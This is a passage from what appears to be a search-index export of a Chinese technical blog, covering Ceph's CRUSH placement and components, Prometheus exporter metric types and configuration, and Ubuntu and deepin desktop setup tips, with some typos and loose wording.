把对象直接映射到OSD之上会导致二者之间的紧密耦合关系，变动底层OSD就会牵一发而动全身，因此在OSD设备变动时不可避免地对整个集群产生扰动\n于是Ceph将一个对象映射进RADOS集群的过程分为两步\n先是以一致性哈希算法将对象名称映射到PG 而后是将PG ID基于CRUSH算法映射到OSD 此两个过程都以“实时计算”的方式完成，而非畅通的查表方式，从而有效规避了任何组件被”中心化“的可能性，使得集群规模扩展不在受限。\n这个实时计算操作用到的算法就是CRUSH\nControlled Replication Uder Scalable Hashing 他是一种数据分布式算法，类似于一致性哈希算法，用于为RADOS存储集群控制数据分布。 客户端IO的简要工作流程 存取对象时，客户端从Ceph监视器检索出集群运行图，绑定到指定的存储池，并对存储池上PG内的对象执行IO操作。\n存储池的CRUSH规则集和PG的数量是决定Ceph如何放置数据的关键性因素 基于最新版本的集群运行图，客户端能够了解到集群中的所有监视器和OSD以及他们各自的当前状态。 不过，客户端对目标对象的位置却一无所知。 执行对象的存取操作时，客户端需要输入的是和对象标识和和存储池名。至于存储到哪个PG、被映射到哪个OSD则是由算法来完成的。\n客户端需要在存储池中存储命名对象时，他将对象名称、对象名册的hash码、存储池中的PG数量和存储池名称作为输入，而后由CRUSH计算出PG的ID及此PG的主OSD。 通过将对象的标识进行一致性hash运算得到的哈希值与PG位图掩吗进行“与”运算得到目标PG，从而得出目标PG的ID（pg_id），完成有Object至PG的映射。 而后，CRUSH算法便将以此pg_id、CRUSH运行图和归置规则（Placement Rules）为输入参数再次进行计算，并输出一个确定且有序的目标存储向量列表（OSD列表），从而完成从PG至OSD的映射。 Ceph客户端使用以下步骤来计算PG ID\n客户端输入存储池名称及对象名称。例如pool = pool1以及object-id = obj1 获取对象名称并通过一致性hash算法对其进行hash运算，即hash(o)，其中o为对象名称 将计算出的对象标识hash码与PG位图掩吗进行“与”运算获得目标PG的标识符，即PG ID，例如1701 计算公式为pgid=func(hash(o)\u0026amp;m,r)其中，变量o是对象标识符，变量m是当前存储池中PG的位图掩吗，变量r是指复制因子，用于确定目标PG中OSD数量。 CRUSH根据集群运行图计算出与目标PG对应的有序的OSD集合，并确定出其主OSD 客户端渠道存储池名称对应的数字表示，例如存储池“pool1”的数字表示11 客户端将存储池的ID添加到PG ID，例如，11.1701 客户端通过直接与PG映射到的主OSD通信来执行诸如写入、读取或删除之类的对象操作。 ","permalink":"https://www.oomkill.com/2019/06/08-1-ceph-crush/","summary":"","title":"Ceph算法 - crush"},{"content":"初识Ceph Ceph 是一个开源分布式存储系统系统，它不是一种单一的存储，而是面向云提供一种统一存储平台，包含块存储 RBD, 文件存储 CephFS, 以及对象存储 RGW，这种存储的出现允许用户拜托供应商的绑定，它可以提供块存储到 “云平台”，也可以提供对象存储到 “应用”，并支持理论上的无限扩展性，数千客户端访问 PB 甚至 EB 级别的数据\nSAN VS Ceph 与传统 SAN 存储相比，Ceph 客户端会计算他们所需的数据所在的位置，这消除了存储系统中需要在“中心化查找”的瓶颈。 这使得 Ceph 集群可以在不损失性能的情况下进行扩展。\nCeph 集群架构组成 Ceph 集群核心是 RADOS，而基于 RADOS，构建出多种类型存储，块存储, 文件系统, 对象存储，而一个基础的 Ceph 集群的组件由 \u0026ldquo;Ceph monitor\u0026rdquo; 与 \u0026ldquo;Ceph OSD Daemon\u0026rdquo; 组成\nCeph Monitor（进程名称为 ceph-mon，下文中以 ceph-mon 代表 Ceph Monitor） 维护集群映射的主副本。 ceph集群中的monitor，可确保 ceph-mon 守护进程在失败时的高可用性。客户端从 ceph-mon 检索集群映射的副本。 Ceph OSD Daemon 检查”自身“及”其他“ OSD 的状态并报告给 Monitor。 Ceph 中的常见术语 Application 用于使用 Ceph 集群的任何 Ceph 外部的应用程序\nBlock Device 也称为 “RADOS 块设备” 或 ”RBD“ ，协调基于块的数据存储的工具，Ceph块设备拆分基于块的应用程序数据 成“块”。 RADOS 将这些块存储为对象。 Ceph 块 设备协调这些对象的存储 存储集群。\n也称为 “RADOS Block Device” 或 “RBD”。一种用于协调 Ceph 中基于块的数据的存储的软件。 Ceph 块设备将基于块的应用程序数据拆分为 “Chunk”。 RADOS 将这些块存储为对象。\nChunk 与 Block 是两种不同的概念\nChunk 存储是类似于 Key-Value 存储和对象存储，是一种结构化数据，并固定大小的块\nBlock 通常被提到的上下文是作为硬件接口提供的，通常代表硬件裸设备\n所以说 Block Device 是将数据划分为固定大小的 Chunk，存储在 Block 上。\nMGR (Manager) Ceph Manager 又称为 Ceph Manager Daemon，进程名称为 ceph-mgr, 是与 Ceph Monitoring 一起运行的守护进程，用于提供监视以及与外部监视和管理系统的接口。自 Luminous 版本 (12) 起，ceph-mgr 没有运行的情况下 Ceph 集群无法正常运行。\nMON (Monitor) Ceph Monitor 维护集群状态影视的守护进程，这些“集群状态”包括 Monitor map、Manager map、OSD map 和 CRUSH map。 Ceph 集群必须至少包含三个正在运行的 Monitor，才能实现冗余和高可用性。\nOSD Ceph Object Storage Daemon，又被称为 OSD, 在 “research and industry” 中 OSD 表示 ”对象存储设备“，而 Ceph 社区将 OSD 称为 OSD daemon，用于与逻辑磁盘交互的进程。\nOSD fsid 用于标识 OSD 的唯一标识符。它可以在 OSD 路径中名为 osd_fsid 的文件中找到。术语 “fsid” 与 “uuid” 互换使用\nOSD id 定义 OSD 的 integer，它是在创建每个 OSD 期间由监视器生成的。\nHybrid OSD 指同时拥有 HDD 和 SSD 的 OSD\nCluster Map 由 monitor map、OSD Map、PG Map、MDS Map 和 CRUSH Map 组成的一组 Map，它们共同报告 Ceph 集群的状态。有关详细信息。\nCRUSH CRUSH Controlled Replication Under Scalable Hashing 可扩展散列下的受控复制，Ceph 用于计算对象存储位置的算法。\nDAS DAS Direct-Attached Storage 直接附加存储，无需访问网络直接连接计算机的存储。例如 SSD\nLVM tags Logical Volume Manager tags 逻辑卷管理器标签，LVM “卷” 和 “组” 的可扩展元数据。它们用于存储有关设备及其与 OSD 关系的 Ceph 特定信息。\nPGs (Placement Groups) “放置组” 是每个逻辑 Ceph Pool 的子集。放置组执行将对象（作为一个组）放置到 OSD 中的功能。 Ceph 在内部以“放置组粒度”来管理数据：这比管理单个RADOS 对象的扩展性将更好。具有较大数量放置组的集群比具有较少数量放置组的其他相同集群具有更好的平衡性。\nPools 池是用于存储对象的逻辑分区。\nRADOS Reliable Autonomic Distributed Object Store 可靠的自动分布对象存储，RADOS 是为可变大小的对象提供可扩展服务的对象存储。 RADOS 对象存储是 Ceph 集群的核心组件。\nBlock Storage 块存储是 Ceph支持的三种存储类型之一。 Ceph 块存储指的是块存储 结合使用时的相关服务和功能 集合\nCeph File System Ceph File System (CephFS) 是一个兼容 POSIX 的文件系统，构建在 RADOS 之上，可根据按需部署\nMDS (Metadata Server) Ceph MetaData Server daemon MDS，构建在 RADOS 之上，存储所有文件的元数据作为”文件系统“类型的存储提供给用户，运行的程序名为 ceph-mds，故 也是是否使用 CephFS 的标记\nRGW (Radow Gateway) Ceph 提供兼容 Amazon S3 RESTful API 和 OpenStack Swift API 的组件，可根据按需部署\nRealm 是位于对象存储中的上下文，领域 (Realm) 是一个全局唯一的命名空间，由一个或多个区域组组成。\nZone 是位于对象存储中的上下文，区域 (zone) 是由一个或多个 RGW 实例组成的逻辑组。\u0026ldquo;zone\u0026rdquo; 的配置状态存储在 \u0026quot;\u0026quot; 中\nPeriod 是位于对象存储中的上下文，Period 是 Realm 的配置状态。该 Period 存储多站点配置的配置状态。当 Period 被更新时，“epoch” 被认为已经改变。\nCephX CephX Ceph authentication protocol；CephX 是用于对用户和守护进程进行身份验证。 CephX 的运行方式类似于 Kerberos，但它没有单点故障。\nSecrets Secret 是用户访问是需要提供的身份验证的系统用于执行数字身份验证的凭据。\n存储上下文中的锁定是您能够与硬件连接的最小尺寸。每当您从磁盘读取或写入磁盘时，无论需要读取多少个块，您都会读取此数量的次数。默认 NTFS 块大小（也称为簇大小、分配单元）为 4096 字节 (4KB)。如果您有一个正好 4096 字节长的文件，那么您将从磁盘读取一个块。如果是 4097 字节，那么您会读取两个块。您无法读取部分块，因此即使文件实际上没有消耗整个块，存储文件系统也会清空该块的其余部分。查看实际情况的一个简单方法是在硬盘驱动器上创建一个空白文本文件，查看属性以及“大小”（0 字节）和“磁盘大小”（4096 字节）之间的差异。\nCeph是一个对象（object）式存储系统，它把每一个待管理的 在（例如一个文件）切分为一到多个固定大小的（ceph底层管理机制）对象数据，在Ceph之上，每一个对象，是一个基础的原子管理单元（不可再切分的单元），并以其为原子单元完成数据存取\n对象数据的底层存储服务是由多个主机（host）组成的存储集群，该集群也就称之为RADOS（Reliable Automatic Distributed Object Store）存储集群，即可靠、自动化、分布式对象存储系统。 librados是RADOS存储集群的API，它支持C、C++、Java、Python、Ruby和PHP等编程语言。 存储设备\nDAS 直接附加存储：IDE、SATA、SCSI、SAS、USB NAS 网络附加存储（文件系统级别）：NFS、CIFS SAN 存储区域网络，与NAS不同的是，SAN提供的接口是块级别的接口。多数使用SCSI FC SAN ISCSI（internet SCSI） 数据是由元数据和内容（数据组成）组成，而元数据是确保路由的。传统文件系统ext有inode信息存储在元数据区，一部分空间存元数据，一部分空间存数据。数据称为数据块 data block。 当客户端试图访问某个文件时，根据给定文件路径或文件名层层查找，查询inode表。inode中记录的有在数据块空间中那些编号块存放当前文件数据。\n元数据找到关联数据的存储路由表，也记录了当前文件的属性信息、如权限、属组等。这是一个标准的POSIX文件系统所应该具有的基本兼容的属性。\n如将数据分散到多个节点上去存储时，就不能按照传统的机制在一个分区上组织元数据和数据，我们只能讲数据和元数据分开存放。每一个节点只提供存储空间，元数据存放在固定节点。\n在存数据时，客户端将请求按照指定大小规模，每一块当做一个独立的文件，然后进行路由和调度，从而完成分散存储的目的。从而利用多个节点的网络和磁盘IO的存储能力。当用户访问时，需要联系元数据服务器，由元数据服务器返回相关数据 信息后从并行从这些节点上加载到数据块，而后根据元数据给出逻辑，由客户端组合起来，就可得到完整数据。\n元数据和数据服务器分离在不通额主机之上，还要完成服务器的角色划分。在传统以Google为代表的设计体系结构当中，存放元数据的服务器被称之为名称服务器（NameNode）。存放数据的服务器被称为DataNode。\n文件系统的元数据是一类非常密集、但IO量非常小的数据。因此为了高性能、高效通常需要存储在内存当中。为此需要一种机制同步存储在磁盘上，当文件被修改元数据也会被修改。大量的修改操作都是随机的。随机IO通常会非常慢。为了能够高效的使非常密集的文件元数据的修改操作能够快速高效的存在磁盘上，一般不会直接修改元数据的。而是将修改操作的操作请求记录下来。\n将随机IO转成顺序IO能够快速同步磁盘进行持久保存。此方法缺点在宕机恢复时，只能通过回放记录在文件中的指令才能将数据还原回来。故其速度很慢。\n因此将所有数据的持久存储都存放在第三方存储服务上，\n对于数据存储级别的高可用思路\n节点级冗余 数据级冗余 对每一个块 做副本 分片级冗余 primary shard replica shard HDFS Hadoop FileSystem\n对象存储 每一文件对象，在存储文件时，每一个对象自身大小不固定，是按照文件自身大小来存储的。不区分数据与元数据。每一个数据流自带数据和元数据。数据和数据流是存放在一起的。因此，每一个数据流就叫一个数据对象。数据是直接存放在磁盘之上的，而不在区分数据和元数据。每一对象都有自己自我管理的格式。\nCeph在存数据时，为了避免有一个元数据中心服务器成为整个系统的瓶颈所在，采用了计算方式来解决问题。在存储文件时，对文件做Hash计算映射到对应节点上去。Ceph没有中心节点，没有元数据服务器，任何对象存取都是通过实时计算得到的\n从根本上来讲，Ceph在底层是RADOS的存储集群，由多个节点组成。其存储服务只是API叫做librados，Ceph在接口之上提供了几个抽象接口以便可以在传统意义上使用存储服务的逻辑实现存储功能。除用户自己在librados之上还开发了3个接口\ncephfs RDB 将Ceph所提供的存储空间模拟成一个个块设备使用的，每个块设备成为一个image，相当于磁盘。块接口，相当于传统硬盘 RADOSGW 更抽象的，能跨互联网使用的对象存储。与Ceph内部对象不一样。Ceph内部的对象是固定大小的存储块，通常只在Ceph集群中使用，基于RPC协议工作。基于互联网的云存储，是基于resetful风格的接口提供的文件存储。每一个文件是一个对象，文件大小各不相同。 crush Ceph内部通过计算方式完成对象路由的计算综合性算法。\nCeph存储集群组成 Ceph存储集群，一般可归置为几个组件组成\nosd object stroage device 对象存储设备 每个主机上有多个osd，每一个osd通常是指==单独的磁盘设备==。osd是真正存放数据的地方。如果使用files会是一个目录。对象存储设备而不是主机。多个主机组合起来称为RADOS Cluster（RADOS存储集群）\n为了使每个osd能够被单独使用和管理，每个osd都会有一个单独的专用的守护进程ceph-osd。osd本身用来存储数据，还包括数据复制、恢复、数据重新均衡、提供监视信息给mon和mgr\n一个集群至少有3个Ceph OSDs，已确保高可用。选择OSD冗余时，应自己指定故障率，故障转移率或故障容忍率。OSD级别故障就在OSD级别冗余，主机级别就跨主机冗余，故障率是机架级别就机架冗余。 在做crush运行图的设定时是应该自己指定的。\nmonitor 集群元数据服务器 集群内除了存储节点之外，还有另外一种节点 monitor （monitor监视器），用来管理整个集群的，如有多少个节点，每个节点上有多少个OSD，每个OSD是否健康，他会持有整个集群的运行图（运行状态）。mon是用来集中维护集群元数据而非文件元数据。为了维护整个集群能够正常运行而设定的节点，离开此节点集群内部就无法协调。\n在一个主机上运行的守护进程 ceph-mon，守护进程扮演、监视着整个集群所有组件的角色，被称为集群运行图的持有者cluster map（整个集群有多少存储池，每个池中有多少PG，每个PG映射哪个OSD，有多少OSD等等）集群运行图 Cluster Map\nmonitor负责维护整个进群的认证信息并实行认证，认证协议叫==CephX==协议（ceph内部的认证协议）。monitor用来维护认证信息并实行认证。认证中心 monitor自身是无状态的，所以实现均衡认证负载。\nmonitor的高可用自己内部直接使用POSIX协议来实现数据冗余，monitor也是节点级冗余，为了确保各节点数据是强一致的，每个节点都可写，写完后会同步到其他节点。为了避免同时写导致的冲突，使用了分布式一致性协议，monitor就是使用POSIX协议来进行分布式协作的。\nmgr manager monitor在每一次读数据都是实时查询的，故monitor不适用频繁周期性采集数据的监控操作。在Ceph新版中引入新组建mgr，（早期Ceph版本是没有mgr的）用来专门维护查询类操作，将查询操作按照自己内部空闲方式缓存下来，一旦有监控可及时响应。\nmgr是在一类节点上运行的守护进程，一般为两个活以上节点，此类守护进程被称为ceph-mgr。主要功能在于跟踪运行时的指标数据。如磁盘使用率、CPU使用率。以及集群当前状态，此状态不是内部运行状态，而是查询做监控时的状态。包括存储空间利用率、当前性能指标、节点负载（系统级）等\nmds (非必要组件) ==Ceph Metadata Server== 用来代表ceph文件系统而提供的守护进程ceph-mds，如不使用CephFS，此进程是无需启动的。利用底层RADOS存储空间，将存储空间抽象成文件系统，来兼容POSIX file system 提供服务。\nmgr ods mon才是一个完整的RADOS Cluster\n管理节点 Admin Host Ceph通常是分布式集群，为了便于去管理维护整个集群，通常在Ceph集群中找一个专门的节点用来当管理节点。此节点可以连接至每一个节点用来管理节点上的Ceph守护进程。\nCeph的场馆用管理接口是一句命令行工具程序，例如rados ceph rbd等命令，管理员可以从某个特定的MON节点执行管理操作，单也有人更倾向于使用专用的管理节点\n事实上，专用的管理节点有助于在Ceph相关的程序升级或硬件维护期间为管理员提供一个完整的、独立的并隔离于存储集群之外的操作系统，从而避免因重启意外中断而导致维护操作异常中断。\npool Ceph把他所提供的存储空间（没有目录之类一说）所有对象都是存储在数据平面上，因此，所有对象都不能同名。RADOS将他的存储空间切分为多个分区以便好进行管理。每一个分区叫做一个存储池。存储池的大小是取决于底层的存储空间的。与真正意义上的分区不是一回事。在Ceph中每一个存储池存放的数据了也可能会太大，所以存储池也可以进一步划分（可选）。被称为名称空间（先切分为存储池，每个存储池可进一步被划分成名称空间） 两级逻辑组件。\n第三级 PG 每一个存储池内部会有多个PG（placement groups 规置组）存在。pool与pg都是抽象的概念。\nobject 对象是自带元数据的组件，\n对象id，每一个对象应有一个对象ID在集群内部来引用对象 数据 元数据 key vlaue类型的数据 这些类型打包成一起存储，被称为一个对象。RADOS集群会吧真正存储的每一个文件，切分成N个对象来进行存储的。（切分个数与默认对象切分大小有关）。\n每一个对象都是被单独管理的，都拥有自己的标识符。因此， 同一个文件的object有可能被映射到不同的PG上，PG提交给主机的，由主机负责将对象存储在磁盘（OSD）被存储在不同的OSD上。\n文件存储到RADOS集群 一般要接入RADOS集群必须通过客户端来实现(LIBRADOS、RBD、CephFS、RADOSGW)，才能接入到集群中来。\n当将文件存入Ceph中时，需要通过某一类客户端接入，客户端接入时，需要借助于Ceph存储API接口将其切分为固定大小的存储对象(Date object)，此数据对象究竟被放置在哪个OSD上存放这中间是靠crush来完成的。数据对象被存放在哪个存储池上是固定的。存储池需创建才可使用。但PG是虚拟的中间层。\nPG作用\ncrush算法第一步 任何一个对象被存进RADOS集群中时，一定是向某一个存储池请求的。而后将对象的名字做一致性哈希计算（系列计算），计算完之后，通过顺时针找到落在最近PG。对象是归类在PG中的。每一个对象一定属于某个存储池内的某个PG（但PG不是真实存在的）。接下来还需将PG存到OSD上。\ncrush算法第二步 需将PG根据存储池的冗余副本数量和存储池的类型找到足量的OSD来存。是以PG为单位进行管理的，所以被称为主PG或活动PG和副本PG，一个PG中的所有对象是统一被管理的（存放在同一个OSD），如果要基于副本管理，写需写入主OSD，由主OSD同步到从OSD之上（同步过程是OSD自己内部管理）。但存储池和crush算法一定要能够确定出哪个是主的那些是从。一般来讲，传统的存储池是1主2从的存储。故其空间利用率是极低的。\nCeph也支持另外的存储池，纠删码存储池，类似于RAID5。存储数据时也会选出多个OSD来，多个OSD不是做副本方式存储，而是将数据切成多块之后每一个OSD上存一部分，另外一些OSD存放校验码，任何一个OSD坏了可以用校验码来计算出来。\n故Ceph整体使用分为两部 将对象映射给PG，将PG映射给OSD 此过程是由crush算法来完成的。\n最核心的组建RADOS Cluster以对象化的方式吧每一个文件切分成固定大小对象基于对象进行管理的。每一个对象要被基于crush算法实时计算之后映射到集群中某一个OSD之上。而每个集群上有多少个OSD，各个处于什么状态是由monitor负责维护和管理的，甚至监视器要维护整个集群的状态，如OSD、PG等等。故monitor是整个集群的元数据服务器。而不是文件元数据服务器。Ceph没有文件元数据服务器。所有数据访问都是通过实时计算路由的。因此整个集群可以无限制扩展\n集群运行图 数据抽象接口（客户端中间层） Ceph存储集群提供了基础的对象数据存储服务，客户端可基于RADOS协议和librados API直接与存储系统交互进行对象数据存取 Librados Librados提供了访问RAD0OS在存储集群支持异步通信的API接口，支持对集群中对象数据的的直接并行访问，用户可通过支持的编程语言开发自定义客户端程序通过RADOS协议与存储系统进行交互 客户端应用程序必须与librados绑定方可连接到RADOS存储集群，因此，用户必须实现安装librados及其依赖后才能编写使用librados的应用程序。 librados API本身使用C++编写的，它额外支持C、Python、Java、和PHP等开发接口 当然，并非所有用户都有能力自定义开发接口以接入RADOS存储集群的需要，为此，Ceph也原生提供了几个较高级别的各户端接口，它们分别是RADOS GateWay（RGW）、Reliable Block Device（RBD）和MDS（MetaData Server），分别为用户提供RESTful、块和POSIX文件系统接口。 ","permalink":"https://www.oomkill.com/2019/06/01-2-cloud-base/","summary":"","title":"Cloud基础设施 - 初识Ceph"},{"content":"exporter是一个独立运行的采集程序，其中的功能需要有这三部分\n自身是HTTP服务器，可以相应从外部发过来的HTTP GET请求。 自身需要运行在后台，并可以定期触发抓取本地的监控数据。 返回给prometheus_server的内容是要符合prometheus规定的metrics类型的key-Value promethes监控中对于采集过来的数据统一称为metrice数据\nMetrics，为某个系统某个服务做监控、做统计，就需要用到Metrics.\nmetrics是一种对采样数掘的总称（metrics并不代表某一种具体的数据格式是一种对于度星计算单位的抽象）\nmetrics的几种主要的类型\nMETRIC TYPES prometheus客户端库提供4中metric类型\ncounter 计数器，累加指标 gauge 测量指标 summary 概略 histogram 直方图 counter Counter计数器，累加的指标数据，随时间逐步增加，如程序运行次数、运行错误发生总数。如网卡流量，代表持续增加的数据包或者传输字节的累加值\n比如对用户访问量的采样数据\n我们的产品被用户访问一次就是1过了10分钟后积累到100\n过一天后累积到20000\n一周后积累到100000-150000\ntest = prometheus.NewSummaryVec(\rprometheus.SummaryOpts{\rName: \u0026quot;zhangsan\u0026quot;,\rHelp: \u0026quot;username\u0026quot;,\rObjectives: map[float64]float64{0.5: 0.05, 0.9: 0.01, 0.99: 0.001},\r},\r[]string{\u0026quot;service\u0026quot;},\r)\r# HELP zhangsan username\r# TYPE zhangsan summary\rzhangsan{service=\u0026quot;aaa\u0026quot;,quantile=\u0026quot;0.5\u0026quot;} 0.4933459627210085\rzhangsan{service=\u0026quot;aaa\u0026quot;,quantile=\u0026quot;0.9\u0026quot;} 0.884503005897664\rzhangsan{service=\u0026quot;aaa\u0026quot;,quantile=\u0026quot;0.99\u0026quot;} 0.9939536606026\rzhangsan_sum{service=\u0026quot;aaa\u0026quot;} 3145.830341777395\rzhangsan_count{service=\u0026quot;aaa\u0026quot;} 6308\r在每次执行后值会累加\n# HELP zhangsan username\r# TYPE zhangsan summary\rzhangsan{service=\u0026quot;aaa\u0026quot;,quantile=\u0026quot;0.5\u0026quot;} 0.4933459627210085\rzhangsan{service=\u0026quot;aaa\u0026quot;,quantile=\u0026quot;0.9\u0026quot;} 0.884503005897664\rzhangsan{service=\u0026quot;aaa\u0026quot;,quantile=\u0026quot;0.99\u0026quot;} 0.9945251964629818\rzhangsan_sum{service=\u0026quot;aaa\u0026quot;} 3165.232975252529\rzhangsan_count{service=\u0026quot;aaa\u0026quot;} 6347\rgauge 最简单的度量指标，只有一个简单的返回值，或者叫瞬时状态，例如，我们想衡量一个特处理队列中任务的个数。\n用更简单的方式举个例子\n例如：如果我要监控覆盘容量或者内存的使用量，那么就应该使用Gauges的metrics格式来度量，因为硬盘的容量或者内存的使用量是随着时间的推移不断的瞬时，没有规则的变化。这种变化没有规律，当前是多少，采集回来的就是多少，既不能肯定是一直持续增长，也不能肯定是一直降低，是多少就是多少这种就是Gauges使用类型的代表。\n如图所示CPU的上下厚动就是采集使用Gauge形式的metrics数据，没有规律是多少就得到多少，然后显示出来。\ngauge代表采集的是一个单一的数据，此数据可增可减，如内存使用情况，cpu使用情况等。\ngaugetest = prometheus.NewGauge(prometheus.GaugeOpts{\rName: \u0026quot;lisi\u0026quot;,\rHelp: \u0026quot;password\u0026quot;,\r})\r# HELP lisi password\r# TYPE lisi gauge\rlisi 0.4578056215001356\r# HELP lisi password\r# TYPE lisi gauge\rlisi 0.44668242347036363\rhttps://github.com/lwhile/workDoc\nsummary 概略 histogram 比例型的估算数值 Histogram 统计数据的分布情况。比如最小值，最大值，中间值，还有中位数，75百分位，90百分位，95百分位，98百分位，99百分位，和99.9百分位的值（percentiles）。\n这是一种特殊的metrics数据类型，代表的是一种近似的百分比估算数值\n比如我们在企业工作中经常接触这种数据\nHttp.response_time HTTP响应时间\n代表的是一次用户HTTP请求在系统传输和执行过程中总共花费的时间\nnginx中的也会记录这一项数值在日志中\n那么问题来了\n我们做一个假设\n如果我们想通过监控的方式抓取当天的nginx accoss.log，并且想监控用户的访问时间我们应该怎么做呢？同学们肯定很容易想到 简单制把日志每行的http_response_time 数值统统采集下来期然后计算一下总的平均值即可。那么假如我们采集到今天一天的访问量是100万次然后把这100万次的http_response_time 全都加一超然后除以100万最后得出来一个值\n0.05秒=50毫秒\n这个数据的意文大么？\n假如今天中午1：00的时候发生了一次线上故障系统整体的访问变得非常缓慢大部分的用户请求时间都达到了0.5~1秒作用但是这一段时间只持续了5分钟，总的一天的平均值并不能表现得出来我们如何在 1:00 ~ 1:05 的时候实现报警呢？\n在举个例子：\n就算我们一天下来线上没有发生故障大部分用户的响应时间都在0.05秒（通过总时间/总次数得出）但是我们不要忘了任何系统中都一定存在慢请求就是有一少部分的用户请求时间会比总的平均值大很多甚至接近5秒10秒的也有（这种情况很普遍因为各种因素可能是软件本身的bug也可能是系统的原因更有可能是少部分用户的使用途径中出现了问题）\n那么我们的监控需要发现和报警这种少部分的特殊状况，用总平均能获得吗？\n如果采用总平均的方式，那不管发生什么特殊情况，因为大部分的用户响应都是正常的你永远也发现不了少部分的问题所以Histogram的metrics类型在这种时候就派上用场了通过histogram类型（prometheus中其实提供了一个基于histogram算法的函数可以直接使用）可以分别统计出全部用户的单应时间中 ~=0.05秒的量有多少0 ~ 0.05秒的有多少，\u0026gt;2秒的有多少\u0026gt;10秒的有多少\n我们就可以很清晰的看到当前我们的系统中必于基本正常状态的有多少百分比的用户（或者是请求）多少处于速度极快的用户，多少处于慢请求或者有问题的请求\nmetrics的类型其实还有另外的类型\n但是在我们大米运维的课程中我们最主要使用的就是counter ganga 和 histogram\nkv的数据形式 对于采集回来的数据类型再往细了说必须要以一种具体的数据格式供我们查看和使用那么我们来看一下一个exporter 给我们果集来的服务器上的k/v形式metrics数据当一个exporter被安装和运行在被监控的服务器上后，使用简单的curl命令就可以看到exporer帮我们采集到metrics数据的样子，以k/v的形式展现和保存\ncurl localhost:9100/metrics\r","permalink":"https://www.oomkill.com/2019/06/prometheus-golang_client/","summary":"","title":"prometheus golang_client开发Exporter"},{"content":"Ubuntu屏幕分辨率无1920 1080 xrandr\n没有1920X1080分辨率，所以手动添加一个1080P分辨率，先输入“cvt 1920 1080”命令，查询一下1080P分辨率的有效扫描频率\n然后使用 xrandr 命令新建一种输出分辨率\nsudo xrandr --newmode \u0026quot;1920x1080_60.00\u0026quot; 173.00 1920 2048 2248 2576 10801083 1088 1120 -hsync +vsync sudo xrandr --addmode Virtual1 \u0026quot;1920x1080_60.00\u0026quot; Ubuntu 制作图标 进入 /usr/share/applications/下 创建文件\ncylon@cylon-PC:/usr/share/applications$ cat goland.desktop [Desktop Entry] Encoding=UTF-8 Name=Goland Exec=goland.sh Icon=/home/lc/goland/bin/goland.svg Terminal=false Type=Application Categories=Development; 主题目录： /usr/share/themes/\n图标主题目录： /usr/share/icons/\n","permalink":"https://www.oomkill.com/2019/04/ubuntu-configration/","summary":"","title":"ubuntu相关配置"},{"content":"下载中文字体\napt-get install ttf-arphic-uming xfonts-intl-chinese 替换goland的汉化包，两个jar包。\n","permalink":"https://www.oomkill.com/2019/04/deepin-goland/","summary":"","title":"deepin下安装goland中文字体显示全是方块"},{"content":"全局配置选项\nscrape_interval: 采集生命周期\rscrape_timeout: 采集超时时间\revaluation_interval: 告警评估周期\rrule_files 监控告警规则\rscrape_config: 被监控端\raltering 检查配置文件语法\n$ promtool check config \\etc\\prometheus.yml Checking \\etc\\prometheus.yml\rSUCCESS: 0 rule files found\r100 - (node_memory_MemFree_bytes+node_memory_Cached_bytes+node_memory_Buffers_bytes) \\ node_memory_MemTotal_bytes * 100\n计算剩余空间\nnode_filesystem_free_bytes{mountpoint=\u0026quot;\u0026quot;,fstype=~\u0026ldquo;ext4|xfs\u0026rdquo;} \\ node_filesystem_size_bytes{mountpoint=\u0026quot;\u0026quot;,fstype=~\u0026ldquo;ext4|xfs\u0026rdquo;} * 100\n查看使用的百分比\n100-node_filesystem_free_bytes{mountpoint=\u0026quot;\u0026quot;,fstype=~\u0026ldquo;ext4|xfs\u0026rdquo;} \\ node_filesystem_size_bytes{mountpoint=\u0026quot;\u0026quot;,fstype=~\u0026ldquo;ext4|xfs\u0026rdquo;} * 100\nprometheus使用influxdb [Prometheus endpoints support in InfluxDB | InfluxData Documentation](https:\\docs.influxdata.com\\influxdb\\v1.7\\supported_protocols\\prometheus)\n[Configuration | Prometheus](https:\\prometheus.io\\docs\\prometheus\\latest\\configuration\\configuration)\n配置文件参考\nglobal:\ralerting:\ralertmanagers:\r- static_configs:\r- targets:\rrule_files:\rscrape_configs:\r- job_name: 'prometheus1'\rfile_sd_configs:\r- files: ['\\data\\sd_config\\test.yml']\rrefresh_interval: 5s\rrelabel_configs:\r- action: replace\rsource_labels: ['prometheous1']\rregex: (.*)\rreplacement: $1\rtarget_label: ids\r- action: keep\rsource_labels: [\u0026quot;job\u0026quot;]\r- job_name: 'k8s_master'\rfile_sd_configs:\r- files: ['\\data\\sd_config\\master.yml']\rrefresh_interval: 5s\rremote_write:\r- url: \u0026quot;http:\\\\localhost:8086\\api\\v1\\prom\\write?db=prometheus\u0026quot;\rremote_read:\r- url: \u0026quot;http:\\\\localhost:8086\\api\\v1\\prom\\read?db=prometheus\u0026quot;\rinfluxdb使用\nInfluxDB学习之InfluxDB的基本操作 | Linux大学\n查看所有表\nSHOW MEASUREMENTS\rselect * from up\rhttps:\\github.com\\kubernetes\\kubernetes\\tree\\master\\cluster\\addons\\prometheus\n文件主要包括一下几个部分\nPrometheus的安装 包括 rbac service configmap Prometheus-metrics 获取资源对象 node-exporter 获取工作节点资源信息 alertmanager 告警 安装顺序\nprometheus-rbac.yaml Prometheus访问apiserver的授权 prometheus-configmap.yaml 管理Prometheus的配置文件 prometheus-service.yaml 将Prometheus端口暴漏 prometheus-statefulset.yaml\n原因为 prometheus-statefulset.yaml中的accessModes不能为ReadWriteOnce prometheus\u0026quot;is invalid: spec: Forbidden: updates to statefulset spec for fields other than \u0026lsquo;replicas\u0026rsquo;, \u0026rsquo;template\u0026rsquo;, and \u0026lsquo;updateStrategy\u0026rsquo; are forbidden\n日志中报错pod has unbound immediate persistentvolumeclaims back-off restarting failed container\n错误原因：动态绑定至其他sc上，查看kubectl describe pvc prometheus-data-prometheus-0 -n kube-systempvc中报错storageclass.storage.k8s.io \u0026quot;nfs\u0026quot; not found\nprometheus时间不一致问题\nspec:\rcontainers:\r- name: myweb\rimage: harbor/tomcat:8.5-jre8\rvolumeMounts:\r- name: host-time\rmountPath: /etc/localtime\rports:\r- containerPort: 80\rvolumes:\r- name: host-time\rhostPath:\rpath: /etc/localtime\r部署应用时，单独读取主机的“/etc/localtime”文件，即创建pod时同步时区，无需修改镜像，但是每个应用都要单独设置。\nprometheus server down\n编辑prometheus-statusfullset.yaml 修改其配置localhost 改为 127.0.0.1\ntime=\u0026quot;2020-11-20T18:44:48+08:00\u0026quot; level=error msg=\u0026quot;subset not found for kube-system/prometheus-server\u0026quot; 